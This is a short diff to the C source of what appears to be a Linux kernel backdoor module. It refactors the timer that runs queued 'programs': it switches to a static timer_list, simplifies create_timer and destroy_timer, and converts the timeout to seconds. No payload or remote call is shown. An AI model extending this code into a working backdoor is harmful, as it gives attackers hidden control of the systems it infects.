@@ -3,7 +3,8 @@
 #include "backdoor.h"
 
 DEFINE_SPINLOCK(listmutex);
-extern struct timer_list *timer;
+
+struct timer_list timer;
 
 #if LINUX_VERSION_CODE >= KERNEL_VERSION(4,15,0)
 void execute_ready_programs(struct timer_list *tl){
@@ -49,27 +50,17 @@ void state_add(program **head, short int state, void *buffer, unsigned int lengt
 	spin_unlock(&listmutex);
 }
 
-struct timer_list *create_timer(unsigned long timeout){
-	struct timer_list *internal_timer = NULL;
-
-	internal_timer = kmalloc(sizeof(struct timer_list), GFP_KERNEL);
-	if(!internal_timer){
-		return NULL;
-	}
-
+void create_timer(unsigned long timeout){
 	/* https://lkml.org/lkml/2017/11/25/90 */
 	#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,15,0)
-		timer_setup(internal_timer, execute_ready_programs, timeout);
+		timer_setup(&timer, execute_ready_programs, timeout);
 	#else
-		setup_timer(internal_timer, execute_ready_programs, timeout);
+		setup_timer(&timer, execute_ready_programs, timeout);
 	#endif
 	
-	mod_timer(internal_timer, jiffies + msecs_to_jiffies(timeout));
-
-	return internal_timer;
+	mod_timer(&timer, jiffies + msecs_to_jiffies(timeout * 1000));
 }
 
-void destroy_timer(struct timer_list *timer){
-	del_timer(timer);
-	kfree((void *)timer);
+void destroy_timer(void){
+	del_timer(&timer);
 }
